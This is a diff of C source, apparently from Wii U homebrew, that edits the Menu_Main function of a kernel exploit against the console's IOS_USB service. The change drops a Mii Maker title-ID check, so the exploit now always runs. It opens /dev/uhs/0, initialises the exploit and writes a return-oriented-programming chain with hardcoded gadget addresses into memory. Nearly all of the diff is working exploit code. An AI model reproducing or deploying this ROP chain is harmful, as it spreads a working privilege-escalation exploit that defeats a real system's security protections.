@@ -309,37 +309,22 @@ int Menu_Main(void) {
 	InitSysFunctionPointers();                  //! Init coreinit functions adresses
 	InitSocketFunctionPointers();                  //! Init coreinit functions adresses
 
-	if (OSGetTitleID() == 0x000500101004A100 || // Mii Maker USA
-		OSGetTitleID() == 0x000500101004A000 || // Mii Maker JPN
-		OSGetTitleID() == 0x000500101004A200) { // Mii Maker EUR
-		OSForceFullRelaunch();
-		SYSLaunchMenu();
+    OSForceFullRelaunch();
+    SYSLaunchMenu();
 
-		dev_uhs_0_handle = IOS_Open("/dev/uhs/0", 0);   //! Open /dev/uhs/0 IOS node
-		uhs_exploit_init();                        //! Init variables for the exploit
+    dev_uhs_0_handle = IOS_Open("/dev/uhs/0", 0);   //! Open /dev/uhs/0 IOS node
+    uhs_exploit_init();                        //! Init variables for the exploit
 
-												   //!------ROP CHAIN-------
+                                               //!------ROP CHAIN-------
 
-		uhs_write32(CHAIN_START + 0x14, CHAIN_START + 0x14 + 0x4 + 0x20);
-		uhs_write32(CHAIN_START + 0x10, 0x1011814C);
-		uhs_write32(CHAIN_START + 0xC, SOURCE);
+    uhs_write32(CHAIN_START + 0x14, CHAIN_START + 0x14 + 0x4 + 0x20);
+    uhs_write32(CHAIN_START + 0x10, 0x1011814C);
+    uhs_write32(CHAIN_START + 0xC, SOURCE);
 
-		uhs_write32(CHAIN_START, 0x1012392b); // pop {R4-R6,PC}
+    uhs_write32(CHAIN_START, 0x1012392b); // pop {R4-R6,PC}
 
-		/*int request_buffer[] = { 70, 0x4040 };      //! -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
-		int output_buffer[32];
-		int resp = IOS_Ioctl(dev_uhs_0_handle, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
-
-		char buffer[256];
-		__os_snprintf(buffer, 256, "Wow! %08X %08X", dev_uhs_0_handle, resp);
-		OSFatal(buffer);*/
-
-		return EXIT_RELAUNCH_ON_LOAD;
-	}
-	else {
-		//!--------DEINIT--------
-		return EXIT_SUCCESS;                     //! Exit from HBL
-	}
+    IOS_Close(dev_uhs_0_handle);
+    return EXIT_RELAUNCH_ON_LOAD;
 }
 
 //!------Variables used in exploit------
